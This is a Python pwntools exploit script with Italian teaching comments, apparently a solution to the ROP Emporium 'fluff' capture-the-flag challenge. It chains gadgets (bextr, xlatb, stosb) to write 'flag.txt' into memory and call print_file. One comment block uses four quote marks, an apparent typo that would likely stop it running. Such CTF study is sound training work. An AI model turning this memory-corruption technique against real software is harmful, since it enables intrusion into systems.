from pwn import *

elf = ELF("./fluff")

p = process("./fluff")
p.recvuntil('> ')

""""
    In questo caso la scrittura in memoria è più complicata, per cui la vedremo passo passo.
""""

stosb = p64(0x0000000000400639)
writable_area = p64(0x0000000000601028)
print_file = p64(0x400510)
pop_rdi = p64(0x00000000004006a3)
xlatb = p64(0x0000000000400628)
pop_bextr = p64(0x000000000040062a)

"""
    Definiamo questo metodo per assicurarci che RDX e RCX siano quelli che vogliamo noi. In particolare,
    chiamando pop_bextr eseguiamo le seguenti operazioni:
      1) pop rdx
      2) pop rcx
      3) add rcx, 0x3ef2
      4) bextr rbx, rcx, rdx
    
    L'operazione bextr scrive in RBX l'estrazione bitwise da RCX dei bit codificati in RDX. In particolare,
    a noi interessano i primi 64 bit di RCX, per cui andremo a prendere i bit da 0 (00) a 64 (40) --> 4000.
    Al passo 3, inoltre, a RCX viene aggiunto il valore 0x3ef2, quindi per ottenere il valore di registro da
    noi desiderato gli sottraiamo 0x3ef2 prima di scriverlo in RCX.
"""

def prepare_rbx(target):
	rop = pop_bextr + p64(0x4000) + p64(target - 0x3ef2) # rdx = 0x4000, rcx = rcx - 0x3ef2
	return rop

"""
    Definisco questo metodo per assicurarmi che AL sia quello che vogliamo noi. Come prima cosa, cerco il 
    carattere di 'flag.txt' che mi serve all'interno del file. Voglio che, alla fine dell'esecuzione del metodo,
    AL corrisponda al carattere che voglio scrivere in memoria.
"""

def prepare_al(char, current_al, elf):
	rop = b""
	target_byte_addr = next(elf.search(char)) # cerco l'indirizzo di char 
	rbx = target_byte_addr - current_al # sistemo RBX in modo che sia quello corretto per xlatb (dopo farò AL + RBX)
	rop += prepare_rbx(rbx) # chiamo prepare_rbx
	rop += xlatb # AL diventa il carattere che cercavo
	return rop, char


payload = b'' 
payload += cyclic(40) 
payload += pop_rdi + writable_area 

target = b'flag.txt' 
prev_al = 0x0b

"""
    Con l'operazione stosb vado a scrivere AL all'indirizzo puntato da RDI, quindi al posto di RDI metto l'indirizzo
    della writable area e scrivo carattere dopo carattere flag.txt
"""

for b in target: # per ogni carattere in flag.txt
	rop , prev_al = prepare_al(b, prev_al,elf) 
	payload += rop + stosb 
	

payload += pop_rdi + writable_area + print_file 
	 

p.send(payload)					   
p.interactive()
